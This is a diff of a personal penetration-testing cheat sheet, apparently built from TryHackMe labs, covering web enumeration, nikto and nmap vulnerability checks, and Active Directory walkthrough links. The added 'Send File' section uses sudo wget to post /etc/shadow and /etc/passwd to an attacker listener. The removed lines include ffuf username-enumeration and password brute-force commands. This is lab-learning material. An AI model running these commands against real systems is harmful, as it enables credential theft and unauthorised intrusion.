@@ -1,6 +1,6 @@
 # Enumeration
 
-## **Stopped at** Breaching Active Directory
+## **Stopped at** ToolsRus
 
 ## **Scans**
 
@@ -208,6 +208,13 @@ dig -t AXFR $HOST.thm @$DNSSERVER
 
 Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)
 
+### Info gathering info
+
+```
+http://$VICTIM/robots.txt
+http://$VICTIM/sitemap.xml
+```
+
 ### Find Directories
 
 This looks for all php files under folder cvs
@@ -226,7 +233,7 @@ dirb http://$VICTIM:$PORT/
 dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt -z10 
 ```
 
-#### Find folders
+### Find folders
 
 **Kali**
 
@@ -244,70 +251,6 @@ ffuf -u http://$VICTIM/static/FUZZ -w /usr/share/dirb/wordlists/big.txt
 
 ```
 dirsearch -u $VICTIM:$PORT 
-```
-
-Nikto Tuning (-T) Options
-
-```
-0 – File Upload
-1 – Interesting File / Seen in logs
-2 – Misconfiguration / Default File
-3 – Information Disclosure
-4 – Injection (XSS/Script/HTML)
-5 – Remote File Retrieval – Inside Web Root
-6 – Denial of Service
-7 – Remote File Retrieval – Server Wide
-8 – Command Execution / Remote Shell
-9 – SQL Injection
-a – Authentication Bypass
-b – Software Identification
-c – Remote Source Inclusion
-x – Reverse Tuning Options (i.e., include all except specified)
-```
-
-Scan for misconfigurations.
-
-```
-nikto -h $VICTIM -T 2 -Format txt 
-```
-
-Scan for SQL injection vulnerabilities.
-
-```
-nikto -h $VICTIM -T 9 -Format txt 
-```
-
-Check if the target is vulnerable to Shellshock
-
-```
-nmap -p 80 $VICTIM --script http-shellshock 
-```
-
-Check if the target is vulnerable to Heartbleed
-
-```
-nmap -p 443  $VICTIM --script ssl-heartbleed
-```
-
-Check if these files exist to gather info
-
-```
-http://$VICTIM/robots.txt
-http://$VICTIM/sitemap.xml
-```
-
-#### &#x20;Username Enumeration
-
-Example on how to find existing usernames from a website. Command would need to be adjusted to work with the webpage and at least one other user account must be known to know the corrector error message.
-
-```
-ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/signup -mr "username already exists" -o users.csv -of csv
-```
-
-#### Brute Force
-
-```
-ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$VICTIM/customers/login -fc 200
 ```
 
 ### Download file
@@ -334,6 +277,86 @@ wget http://$VICTIM:81/$FILE
 ```
 certutil -urlcache -f http://$KALI:81/$FILE $FILE
 ```
+
+### Send File
+
+#### wget
+
+**Examples**
+
+[wgel-ctf.md](../walkthroughs/tryhackme/wgel-ctf.md "mention")
+
+**Victim**
+
+```
+nc -lvnp 4444
+```
+
+**Victim**
+
+```
+sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
+sudo -u root /usr/bin/wget --post-file=/etc/passwd $KALI:4444
+```
+
+### Find Vulnerabilities&#x20;
+
+Nikto Tuning (-T) Options
+
+```
+0 – File Upload
+1 – Interesting File / Seen in logs
+2 – Misconfiguration / Default File
+3 – Information Disclosure
+4 – Injection (XSS/Script/HTML)
+5 – Remote File Retrieval – Inside Web Root
+6 – Denial of Service
+7 – Remote File Retrieval – Server Wide
+8 – Command Execution / Remote Shell
+9 – SQL Injection
+a – Authentication Bypass
+b – Software Identification
+c – Remote Source Inclusion
+x – Reverse Tuning Options (i.e., include all except specified)
+```
+
+#### Scan for misconfigurations
+
+```
+nikto -h $VICTIM -T 2 -Format txt 
+```
+
+#### Scan for SQL injection vulnerabilities.
+
+```
+nikto -h $VICTIM -T 9 -Format txt 
+```
+
+#### Authenticated nikito scan
+
+**Examples**
+
+[toolsrus.md](../walkthroughs/tryhackme/toolsrus.md "mention")
+
+**Kali**
+
+```
+nikto -id $USERNAME:$PASSWORD -h http://$VICTIM:80/manager/html
+```
+
+#### Check for Shellshock
+
+```
+nmap -p 80 $VICTIM --script http-shellshock 
+```
+
+#### **Check for  Heartbleed**
+
+```
+nmap -p 443  $VICTIM --script ssl-heartbleed
+```
+
+
 
 ### Run Web server
 
@@ -457,17 +480,29 @@ chmod +x snmpcheck-1.9.rb
 
 ## **TCP/389 - LDAP**
 
-### Breaching Active Directory
+### Enumerating Active Directory
 
-A lot of info. Just read through [#breaching-active-directory](enumeration.md#breaching-active-directory "mention")
+**Examples**
+
+[enumerating-active-directory.md](../walkthroughs/tryhackme/enumerating-active-directory.md "mention")
+
+### Breaching Active Directory
 
 **Examples**
 
 [breaching-active-directory.md](../walkthroughs/tryhackme/breaching-active-directory.md "mention")
 
+### Exploiting Active Directory
 
+**Examples**
 
+[exploiting-active-directory.md](../walkthroughs/tryhackme/exploiting-active-directory.md "mention")
 
+### Persisting Active Directory
+
+**Examples**
+
+[persisting-active-directory.md](../walkthroughs/tryhackme/persisting-active-directory.md "mention")
 
 ## **TCP/445  - SMB**
 
